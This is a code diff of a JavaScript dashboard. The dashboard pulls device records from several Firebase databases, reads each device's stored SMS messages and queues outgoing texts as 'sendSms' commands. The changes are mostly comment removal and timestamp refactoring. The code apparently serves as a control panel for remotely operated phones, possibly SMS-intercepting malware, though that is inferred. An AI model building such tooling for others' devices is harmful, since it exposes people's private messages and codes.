@@ -88,7 +88,6 @@ async function connectToFirebase(source) {
         console.log(`📢 Connecting to Firebase source: ${id}`);
         console.log(`📢 URL: ${url}`);
 
-        // Test connection using clients.json
         const testUrl = `${url}/clients.json?auth=${key}&shallow=true`;
         const response = await fetch(testUrl);
         
@@ -151,9 +150,6 @@ async function fetchAllDevices() {
     return allDevices;
 }
 
-/**
- * Get device status from client data
- */
 function getDeviceStatus(clientData) {
     // 1. Check direct status field
     if (clientData.status !== undefined) {
@@ -213,10 +209,6 @@ async function fetchDevicesFromSource(sourceId) {
         for (const clientId of clientIds) {
             const clientData = data[clientId];
             
-            // ============================================
-            // EXTRACT BATTERY
-            // ============================================
-            
             let battery = 50;
             if (clientData.battery) {
                 const batStr = String(clientData.battery);
@@ -224,22 +216,10 @@ async function fetchDevicesFromSource(sourceId) {
                 if (isNaN(battery)) battery = 50;
             }
             
-            // ============================================
-            // STATUS DETECTION - Using the helper function
-            // ============================================
-            
             const status = getDeviceStatus(clientData);
-            
-            // ============================================
-            // GET PHONE NUMBER
-            // ============================================
             
             const commandData = clientData.command || clientData.commands || clientData.webhookEvent?.sendSms || {};
             const phoneNumber = commandData.number || commandData.to || clientData.number || 'N/A';
-            
-            // ============================================
-            // BUILD DEVICE OBJECT
-            // ============================================
             
             const device = {
                 id: clientId,
@@ -250,13 +230,13 @@ async function fetchDevicesFromSource(sourceId) {
                 battery: battery,
                 signal: '4G',
                 model: commandData.simSlot !== undefined ? `SIM ${parseInt(commandData.simSlot) + 1}` : 'Unknown',
-                lastSeen: clientData.lastMessageTime ? new Date(clientData.lastMessageTime).toISOString() : new Date().toISOString(),
+                lastSeen: clientData.lastMessageTime ? timestampToISO(clientData.lastMessageTime) : new Date().toISOString(),
                 sims: phoneNumber ? [phoneNumber] : ['N/A'],
                 unread: 0,
                 raw: clientData,
                 smsBody: commandData.body || commandData.message || commandData.text || '',
                 smsSender: commandData.number || commandData.from || 'Unknown',
-                smsTime: commandData.timestamp ? new Date(commandData.timestamp).toISOString() : new Date().toISOString()
+                smsTime: commandData.timestamp ? timestampToISO(commandData.timestamp) : new Date().toISOString()
             };
             
             devices.push(device);
@@ -296,7 +276,6 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
     try {
         const { url, key } = instance;
         
-        // Fetch messages for specific device from messages/{deviceId}.json
         const apiUrl = `${url}/messages/${deviceId}.json?auth=${key}&orderBy="$key"&limitToLast=${limit}`;
         console.log(`📢 Fetching messages for device: ${deviceId}`);
         
@@ -313,23 +292,40 @@ async function fetchSmsForDevice(deviceId, sourceId, simNumber, limit = 150) {
             return [];
         }
         
-        // Convert messages to array and sort by timestamp
         const messages = Object.values(data);
         
         // Sort by timestamp descending (newest first)
-        messages.sort((a, b) => (b.id || b.timestamp || 0) - (a.id || a.timestamp || 0));
+        messages.sort((a, b) => {
+            const aTime = a.id || a.timestamp || 0;
+            const bTime = b.id || b.timestamp || 0;
+            return bTime - aTime;
+        });
         
         console.log(`📢 Found ${messages.length} messages for device: ${deviceId}`);
         
-        return messages.map(msg => ({
-            id: msg.id || msg.timestamp || Date.now(),
-            sender: msg.sender || msg.from || 'Unknown',
-            body: msg.message || msg.body || msg.text || '',
-            time: msg.dateTime || (msg.timestamp ? new Date(msg.timestamp).toISOString() : new Date().toISOString()),
-            simNumber: msg.simNumber || 'N/A',
-            type: msg.type || 'incoming',
-            raw: msg
-        }));
+        return messages.map(msg => {
+            // Handle different timestamp formats
+            let timeStr = '';
+            if (msg.dateTime) {
+                timeStr = msg.dateTime;
+            } else if (msg.timestamp) {
+                timeStr = timestampToISO(msg.timestamp);
+            } else if (msg.id) {
+                timeStr = timestampToISO(msg.id);
+            } else {
+                timeStr = new Date().toISOString();
+            }
+            
+            return {
+                id: msg.id || msg.timestamp || Date.now(),
+                sender: msg.sender || msg.from || 'Unknown',
+                body: msg.message || msg.body || msg.text || '',
+                time: timeStr,
+                simNumber: msg.simNumber || 'N/A',
+                type: msg.type || 'incoming',
+                raw: msg
+            };
+        });
         
     } catch (error) {
         console.error(`❌ Error fetching SMS for device ${deviceId}:`, error);
@@ -381,7 +377,6 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
             type: "sendSms"
         };
 
-        // Get existing data first
         const getUrl = `${url}/clients/${deviceId}.json?auth=${key}`;
         const getResponse = await fetch(getUrl);
         let existingData = {};
@@ -389,7 +384,6 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
             existingData = await getResponse.json();
         }
         
-        // Update with new SMS data
         const updatedData = {
             ...existingData,
             command: smsData,
@@ -409,7 +403,6 @@ async function sendSms(deviceId, sourceId, simNumber, toNumber, message) {
             throw new Error(`HTTP ${response.status}`);
         }
         
-        // Also add to messages collection
         const msgId = Date.now();
         const msgUrl = `${url}/messages/${deviceId}/${msgId}.json?auth=${key}`;
         await fetch(msgUrl, {
